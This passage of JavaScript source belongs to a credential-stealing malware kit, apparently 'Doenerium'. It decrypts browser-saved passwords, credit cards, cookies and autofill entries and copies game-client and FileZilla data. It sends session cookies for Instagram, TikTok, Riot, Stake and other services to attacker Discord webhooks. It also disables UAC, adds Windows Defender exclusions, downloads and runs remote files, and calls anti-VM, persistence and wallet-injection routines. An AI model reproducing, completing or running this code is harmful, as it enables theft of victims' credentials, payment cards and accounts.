            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              Buffer.from(browserPath[_0x261d97][3], 'hex'),
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');
            
            const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nDate Created: ' +
                dateCreated +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length === 0) {
    _0x540754.push('no password found for ');
  }

  if (_0x540754.length) {
    const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
    if (!fs.existsSync(passwordsFolderPath)) {
      fs.mkdirSync(passwordsFolderPath);
    }

    const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
    fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}


async function getCards() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const webData = browserPath[_0x261d97][0] + 'Web Data';
    const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';

    const key = Buffer.from(browserPath[_0x261d97][3], 'hex');

    fs.copyFileSync(webData, copiedFilePath);

    const databaseConnection = new sqlite3.Database(copiedFilePath);

    await new Promise((resolve, reject) => {
      databaseConnection.each(
        'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
        (err, card) => {
          if (err) {
            reject(err);
          } else {
            try {
              const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
              const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
              const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
              const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
              _0x540754.push(cardInfo);
            } catch (error) {}
          }
        },
        () => {
          resolve();
        }
      );
    });

    try {
      databaseConnection.close();
      fs.unlinkSync(copiedFilePath);
    } catch (error) {}
  }

  if (_0x540754.length === 0) {
    _0x540754.push('no cards found');
  }

  if (_0x540754.length) {
    const cardsFolderPath = path.join(mainFolderPath, 'Cards');
    if (!fs.existsSync(cardsFolderPath)) {
      fs.mkdirSync(cardsFolderPath);
    }

    const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}

async function getCookies() {
    const cookiesData = {};
    cookiesData['banner'] = [`${user.copyright}\n`];
    const matchedKeywords = [];

    for (let i = 0; i < browserPath.length; i++) {
        const networkPath = path.join(browserPath[i][0], 'Network');

        if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
            continue;
        }

        let browserFolder;
        if (browserPath[i][0].includes('Local')) {
            browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
        }

        const cookiesPath = path.join(networkPath, 'Cookies');
        const db = new sqlite3.Database(cookiesPath);

        await new Promise((resolve) => {
            db.each(
                'SELECT * FROM cookies',
                function (err, row) {
                    if (err) {
                        console.error(`Error reading cookies from ${cookiesPath}:`, err);
                        return;
                    }

                    let encryptedValue = row.encrypted_value;
                    let iv = encryptedValue.slice(3, 15);
                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                    let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                    let decrypted = '';

                    try {
                        const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                        decipher.setAuthTag(authTag);
                        decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                        // Handle different services
                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                            SubmitInstagram(`${decrypted}`);
                        } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
                            stealTikTokSession(`${decrypted}`);
                        } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
                            setRedditSession(`${decrypted}`);
                        } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
                            SpotifySession(`${decrypted}`);
                        } else if (row.name === '.ROBLOSECURITY') {
                            SubmitRoblox(`${decrypted}`);
                        } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
                            RiotGameSession(`${decrypted}`);
                        } else if (row.host_key === 'stake.com' && row.name === 'session') {
                            sendStakeSessionToDiscord(`${decrypted}`);
                        }

                        // Search for keywords
                        for (const keyword of keywords) {
                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
                                matchedKeywords.push(keyword);
                            }
                        }
                    } catch (error) {
                        console.error(`Error decrypting cookies for ${row.host_key}:`, error);
                    }

                    if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
                        cookiesData[`${browserFolder}_${browserPath[i][1]}`] = [];
                    }

                    cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
                    );

                    count.cookies++;
                },
                () => {
                    resolve('');
                }
            );
        });
    }

    // Send matched keywords to Discord webhook
    if (matchedKeywords.length > 0) {
        sendKeywordsToDiscord(matchedKeywords);
    }

    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (browserName.toLowerCase() === 'banner') {
            continue;
        }

        if (cookies.length !== 0) {
            const cookiesContent = cookies.join('');

            // Add the banner content to the beginning of each cookies file
            const cookiesWithBanner = `${user.copyright}\n${cookiesContent}`;
            const fileName = `${browserName}.txt`;

            // Specify the folder path for Cookies
            const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
            const cookiesFilePath = path.join(cookiesFolderPath, fileName);

            try {
                if (!fs.existsSync(cookiesFolderPath)) {
                    fs.mkdirSync(cookiesFolderPath);
                }

                // Write the individual cookies file to the Cookies folder
                fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });

                // Move the cookies file to the main folder
                moveFileToFolder(cookiesFilePath, 'Cookies');
            } catch (error) {
                console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
            }
        }
    }
}

async function sendKeywordsToDiscord(keywords) {
    try {
        // Format keywords as clickable links separated by commas
        const formattedKeywords = keywords.map(keyword => `[**${keyword}**](https://${encodeURIComponent(keyword)})`).join(', ');

        // Embed style
        const embed_data = {
            "title": "Doenerium Keywords",
            "description": formattedKeywords,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = {
            "embeds": [embed_data]
        };

        const headers = {
            "Content-Type": "application/json"
        };

        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

async function sendStakeSessionToDiscord(decrypted) {
    try {
        // Embed style
        const embed_data = {
            "title": "Stake.com Session Detected",
            "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            },
            "thumbnail": {
                "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
            }
        };

        const payload = {
            "embeds": [embed_data]
        };

        const headers = {
            "Content-Type": "application/json"
        };

        await axios.post(discordWebhookUrl, payload, { headers });
        await axios.post(discordWebhookUr1, payload, { headers });
    } catch (error) {
        console.error('Error sending Stake session to Discord:', error);
    }
}



async function getAutofills() {
  const autofillData = [];

  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);

    if (!browserPathExists) {
      continue;
    }

    const applicationName = pathData[0].includes('Local')
      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';

    fs.copyFileSync(webDataPath, webDataDBPath);

    const db = new sqlite3.Database(webDataDBPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM autofill',
        function (error, row) {
          if (row) {
            autofillData.push(
              '================\nName: ' +
                row.name +
                '\nValue: ' +
                row.value +
                '\nApplication: ' +
                applicationName +
                ' ' +
                pathData[1] +
                '\n'
            );
          }
        },
        function () {
          resolve('');
        }
      );
    });

    if (autofillData.length === 0) {
      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
    }
  }

  if (autofillData.length) {
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

    if (!fs.existsSync(autofillsFolderPath)) {
      fs.mkdirSync(autofillsFolderPath);
    }

    fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}
   

function copyriot(source, target, excludeList = []) {
    const targetFolder = path.join(target, path.basename(source));

    if (!fs.existsSync(targetFolder)) {
        fs.mkdirSync(targetFolder, { recursive: true });
    }

    if (fs.lstatSync(source).isDirectory()) {
        const files = fs.readdirSync(source);
        files.forEach((file) => {
            const curSource = path.join(source, file);
            const curTarget = path.join(targetFolder, file);

            if (!excludeList.some(excludedFile => curSource.includes(excludedFile))) {
                if (fs.lstatSync(curSource).isDirectory()) {
                    copyriot(curSource, targetFolder, excludeList);
                } else {
                    fs.copyFileSync(curSource, curTarget);
                }
            }
        });
    }
}


async function SubmitRiotGames() {
    try {
        var exists = false;

        if (fs.existsSync("C:\\ProgramData\\Riot Games")) {
            exists = true;
            exec("taskkill /IM \"RiotClientServices.exe\" /F", (error, stdout, stderr) => {});
            await new Promise(resolve => setTimeout(resolve, 2500));
        } else {
            exists = false;
        }

        if (exists) {
            const riotGamesSourcePath = "C:\\ProgramData\\Riot Games";
            const riotGamesDestinationPath = path.join(mainFolderPath, 'RiotGames', 'ProgramData');

            const riotGamesExcludeList = [
                "Metadata\\valorant.live\\valorant.live.db",
                "Metadata\\valorant.live\\valorant.live.manifest",
                "Metadata\\valorant.live\\valorant.live.preview.manifest",
                "Metadata\\league_of_legends.live\\league_of_legends.live.preview.manifest",
                "Metadata\\vanguard\\setup.exe"
            ];

            try {
                copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
                console.log(`Copied Riot Games data to ${riotGamesDestinationPath}`);
            } catch (err) {
                console.error(`An error occurred while copying Riot Games data: ${err.message}`);
            }

            const riotGamesLocalAppDataSourcePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Riot Games`;
            const riotGamesLocalAppDataDestinationPath = path.join(mainFolderPath, 'RiotGames', 'AppData', 'Local');

            try {
                copyriot(riotGamesLocalAppDataSourcePath, riotGamesLocalAppDataDestinationPath);
                console.log(`Copied Riot Games Local AppData to ${riotGamesLocalAppDataDestinationPath}`);
            } catch (err) {
                console.error(`An error occurred while copying Riot Games Local AppData: ${err.message}`);
            }

            console.log('Riot Games data copied to mainFolder/RiotGames');
        }
    } catch (error) {
        console.error(`Error in SubmitRiotGames: ${error.message}`);
    }
}



async function RiotGameSession(cookie) {
    try {
        const response = await axios.get('https://account.riotgames.com/api/account/v1/user', {
            headers: { "Cookie": `sid=${cookie}` }
        });

        const embed_data = {
            "title": ``,
            "description": ``,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            },
            "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
            "author": {
                "name": "Valorant Session Detected",
                "icon_url": "https://i.hizliresim.com/qxnzimj.jpg"
            }
        };

        const username = String(response.data.username);
        const email = String(response.data.email);
        const region = String(response.data.region);
        const locale = String(response.data.locale);
        const country = String(response.data.country);
        const mfa = String(response.data.mfa.verified);

        const fields = [
            { "name": "Username", "value": "```" + username + "```", "inline": true },
            { "name": "Email", "value": "```" + email + "```", "inline": true },
            { "name": "Region", "value": "```" + region + "```", "inline": true },
            { "name": "Locale", "value": "```" + locale + "```", "inline": true },
            { "name": "Country", "value": "```" + country + "```", "inline": true },
            { "name": "MFA Enabled?", "value": "```" + mfa + "```", "inline": true },
            { "name": "Cookie", "value": "```" + cookie + "```", "inline": false }
        ];

        embed_data["fields"] = fields;

        const payload = {
            "embeds": [embed_data]
        };

        const headers = {
            "Content-Type": "application/json"
        };

        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error(`Error in RiotGameSession: ${error.message}`);
    }
}


//
async function submitFileZilla() {
  const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');

  if (fs.existsSync(fileZillaSource)) {
    copyFolder(fileZillaSource, fileZillaDestination);
  }
}

function disableuac() {
    try {
        // Command to disable UAC
        const command = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f';

        // Execute the command
        execSync(command, { stdio: 'inherit' });
    } catch (error) {
        console.error(`Failed to disable UAC: ${error.message}`);
    }
}


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
  return new Promise(async (resolve) => {
    try {
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });

      await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}

const saveDir = 'C:\\ProgramData\\Microsoft';

async function binder(url, saveDir) {
  try {
    // Add Windows Defender exclusion for the save directory
    addDefenderExclusion(saveDir);

    // Ensure the save directory exists
    if (!fs.existsSync(saveDir)) {
      fs.mkdirSync(saveDir, { recursive: true });
    }

    const fileName = path.basename(url);
    const filePath = path.join(saveDir, fileName);

    const response = await axios({
      url,
      method: 'GET',
      responseType: 'stream'
    });

    response.data.pipe(fs.createWriteStream(filePath));

    response.data.on('end', () => {
      console.log(`File downloaded and saved to ${filePath}`);
      executeCommandbinder(filePath);
    });

    response.data.on('error', (err) => {
      console.error('Error during file download', err);
    });

  } catch (error) {
    console.error('Error while running the script', error);
  }
}

function executeCommandbinder(filePath) {
  const command = `start "" "${filePath}"`;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing the command: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Standard error: ${stderr}`);
      return;
    }
    console.log(`Standard output: ${stdout}`);
  });
}

function addDefenderExclusion(directory) {
  const command = `powershell -Command "Add-MpPreference -ExclusionPath '${directory}'"`;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error adding Windows Defender exclusion: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Standard error: ${stderr}`);
      return;
    }
    console.log(`Windows Defender exclusion added for ${directory}`);
  });
}


// Browser Functions
function manageBrowsers() {
    closeBrowsers();
    Killchrome();
    getEncrypted();
    getTokens();
    submitFileZilla();
}


// Games Functions
function games() {
    SubmitRiotGames();
    submitMinecraft();
    StealEpicGames();
    SubmitSteam();
    stealSteamSession();
}

// Browsers Data Extractions
function browsers() {
    getCookies();
    getAutofills();
    getCards();
    getPasswords();
}

// File/VPN Stealer
function filevpn() {
    stealFiles();
}

// 2FA/A2F Functions
function backupcodes() {
    findBackupCodes();
    findEpicGamesBackupCodes();
    findGithubBackupCodes();
}

// Wallet Injection
function wallet() {
    localWalletData();
    walletinjection();
}

// Miscellaneous Functions
function handleMiscellaneous() {
    //createRunBat();
    createAndExecuteScripts();
    redirectErrorsToLog();
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}
    main();
    hideconsole();
    antivm();
    //binder();
    initializeFolders();
    manageBrowsers();
    games();
    browsers();
    filevpn();
    backupcodes();
    wallet();
    disableuac();
    computerinfo();
    startup();
    handleMiscellaneous();
    SubmitTelegram();